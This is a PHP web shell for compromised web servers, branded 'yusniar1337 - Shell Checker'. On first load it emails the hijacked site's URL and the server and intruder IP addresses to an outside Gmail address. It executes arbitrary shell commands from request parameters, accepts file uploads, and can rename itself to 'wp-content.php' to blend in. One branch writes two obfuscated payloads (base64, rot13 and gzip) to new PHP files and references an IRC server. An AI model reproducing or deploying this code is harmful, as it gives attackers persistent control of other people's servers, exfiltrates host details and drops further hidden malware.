<?php
session_start();
error_reporting(0);
if (!isset($_SESSION['bajak']))	{
$visitcount = 0;
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$body = "phpThumb Shells \n$web$inj";
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {$security= "SAFE_MODE = OFF";}
else {$security= "SAFE_MODE = ON";};
$serper=gethostbyname($_SERVER['SERVER_ADDR']);
$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);
mail("john.brayden239@gmail.com", "$body","Hasil Bajakan http://$web$inj\n$security\nIP Server = $serper\n IP Injector= $injektor");
$_SESSION['bajak'] = 0;
}
else {$_SESSION['bajak']++;};
if(isset($_GET['clone'])){
$source = $_SERVER['SCRIPT_FILENAME'];
$desti = $_SERVER['DOCUMENT_ROOT']."/wp-content.php";
rename($source, $desti);
}
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {$security= "SAFE_MODE : OFF";}
else {$security= "SAFE_MODE : ON";}
echo "<title>yusniar1337- Shell Checker</title><br>";
echo "<font size=3 color=#FFF5EE>I Am Not Anonymous<br>";
echo "<font size=3 color=#FFF5EE>Server : irc.asther.org 7000<br>";
echo "<font size=3 color=#FFF5EE>Status : Scanner ON<br><br>";
echo "<font size=2 color=green><b>".$security."</b><br>";
$cur_user="(".get_current_user().")";
echo "<font size=2 color=green><b>User : uid=".getmyuid().$cur_user." gid=".getmygid().$cur_user."</b><br>";
echo "<font size=2 color=green><b>Uname : ".php_uname()."</b><br>";
function pwd() {
$cwd = getcwd();
if($u=strrpos($cwd,'/')){
if($u!=strlen($cwd)-1){
return $cwd.'/';}
else{return $cwd;};
}
elseif($u=strrpos($cwd,'\\')){
if($u!=strlen($cwd)-1){
return $cwd.'\\';}
else{return $cwd;};
};
}
echo '<form method="POST" action=""><font size=2 color=green><b>Command</b><br><input type="text" name="cmd"><input type="Submit" name="command" value="eXcute"></form>';
echo '<form enctype="multipart/form-data" action method=POST><font size=2 color=green><b>Upload File</b></font><br><input type=hidden name="submit"><input type=file name="userfile" size=28><br><font size=2 color=green><b>New name: </b></font><input type=text size=15 name="newname" class=ta><input type=submit class="bt" value="Upload"></form>';
if(isset($_POST['submit'])){
$uploaddir = pwd();
if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};
move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name);
if(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name)){
echo "Upload Failed";
} else { echo "Upload Success to ".$uploaddir.$name." :D "; }
}
if(isset($_POST['command'])){
$cmd = $_POST['cmd'];
echo "<pre><font size=3 color=#FFF5EE>".shell_exec($cmd)."</font></pre>";
}
elseif(isset($_GET['cmd'])){
$comd = $_GET['cmd'];
echo "<pre><font size=3 color=#FFF5EE>".shell_exec($comd)."</font></pre>";
}
elseif(isset($_GET['jalang'])){
$xox = "recky.php"; 
$xvx = "metri.php"; 
$box = gzinflate(str_rot13(base64_decode('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')));
$bot = gzinflate(str_rot13(base64_decode('zZdOYoIwGEDvJv6H3kMT4D4Xt8uy4y67G4QyVZCStgyc2X+feUcqNF2Tke/bVgvVSs33fPH+ocqq5SJCSnZdxjJ05Z62uZBv5dGWxt5tfV4uHrunK69so5JxRUlqbtg0WiBMVvkh+shSkNUhdAcmUiBbVvwXMqy2FeWFes2PxEJsanLTrb319leM68tJJyKbiUs0lZ+wpixLlBA/ZYLPUT6VLfEFq2xZnbC7mcAplWRp+w268P+CfH5taE7s5qFot2t3HrCEhPJLehFTuyfDj7gi44369QRLI68OgDD6Co2iQF4mtA0uv/jBxmcmiygODo22eSwv/7n3uVzQT0NGe1FTi2+vFXW4ANshnQupqs7FEPWGD6+pjgeVRwdQKaozjZ7dDCFPsVl8LBkw63I8B64cKCUzHQBQlkRsJmiz7J3BQGbvLGL1e/VBT9KjKt73ArhpPRNH7p6JIrRvI1Xco27F7aFgsvY8s0Z32DCKNm9wDDx3ycZ0wBMAp2Aj+L8T4j3i9rSNPoCTbsYeTItHUk/IjNd9k9QStlcDFUXTgYohqFOHSmaAg1c5YKFnHIhTf7TBUHXUlI4z/pidMpwCRgeUSVrxdW1ZMuQskO2v0Pny+LD7Ag==')));
$abc = fopen($xox,"w"); 
$def = fopen($xvx,"w"); 
fwrite($abc,$bot); 
fclose($abc); 
fwrite($def,$box); 
fclose($def); 
}
else { echo "<pre><font size=3 color=#FFF5EE>".shell_exec('ls -la')."</font></pre>";
}
echo "<center><font size=4 color=green>by <font size=4 color=white>Yusniar1337<font size=4 color=green>Fz<font size=4 color=#FFF5EE></center>";
?>
<link REL="SHORTCUT ICON" HREF="#"></link><body bgcolor="#000000"></body>
